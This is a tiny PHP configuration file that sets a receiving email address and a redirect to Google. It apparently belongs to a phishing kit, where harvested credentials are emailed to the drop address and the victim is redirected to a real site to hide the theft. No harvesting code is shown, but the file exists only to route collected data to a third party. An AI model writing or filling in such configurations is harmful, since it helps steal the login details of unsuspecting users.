<?php 
$Receive_email="dugzm@protonmail.com";
$redirect="https://www.google.com/";
?>